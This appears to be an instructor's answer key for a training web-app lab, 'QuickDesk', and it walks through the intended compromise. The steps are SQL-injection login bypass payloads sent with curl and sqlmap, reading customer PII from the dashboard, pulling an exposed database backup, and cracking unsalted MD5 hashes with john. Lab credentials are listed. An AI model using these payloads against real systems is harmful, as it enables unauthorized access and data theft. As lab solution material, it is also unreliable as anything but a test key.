# Solution — 01 QuickDesk (easy, webapp set)

> Spoilers — instructor's answer key.

## Surface

`GET /` is the portal; `GET /login.php` is the agent sign-in (POST `username`/`password`).
`GET /dashboard.php` shows the customer book once a session exists. A nightly SQL dump is
served straight from the web root at `GET /backup/quickdesk.sql.bak`. MariaDB
(`db.quickdesk.lab`) is on the network.

## Intended chain (any one route authenticates; the data finding stands on its own)

1. **SQL-injection auth bypass** — `login.php` interpolates `username` straight into the
   query (`… WHERE username = '$u' AND password = '<md5>'`). The username field is the
   injection point:
   ```sh
   curl -s -i http://127.0.0.1:8501/login.php \
     --data-urlencode "username=admin' -- " --data-urlencode 'password=x'
   ```
   returns a redirect to `dashboard.php` with an **admin** session. `' OR '1'='1' -- ` works
   too, and `sqlmap -u …/login.php --data='username=a&password=b'` dumps both tables.
2. **Customer PII** — `dashboard.php` lists the **customers** book: names, billing emails,
   phone numbers, card last-4 and MRR (e.g. `e.okonkwo@brightwater-logistics.example`). This
   is the reportable data exposure.

**Alternate / supporting (credential finding):**
- `GET /backup/quickdesk.sql.bak` leaks the `users` INSERT with **unsalted MD5** hashes. Crack
  offline:
  ```sh
  echo '4ca7c5c27c2314eecc71f67501abb724' > h.txt
  john --format=raw-md5 --wordlist=rockyou.txt h.txt    # -> letmein123
  ```
  `admin:letmein123`, `jdoe:batman`, `mchen:Summer2023` all crack — valid logins without the
  SQLi, and realistic candidates for **credential reuse** elsewhere.

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `exposed-db-backup` | admin MD5 `4ca7c5c27c2314…` | `GET /backup/quickdesk.sql.bak` |
| `admin-weak-hash` | same hash in `users` | MariaDB `users` table |
| `customer-pii` | `e.okonkwo@brightwater-logistics.example`, … | MariaDB `customers` table |

Users: `admin:letmein123` (admin), `jdoe:batman`, `mchen:Summer2023` (agents).

## Reset

`make lab-restore LAB=01-easy-php-plain` (recreate — drops the MariaDB volume and re-seeds).
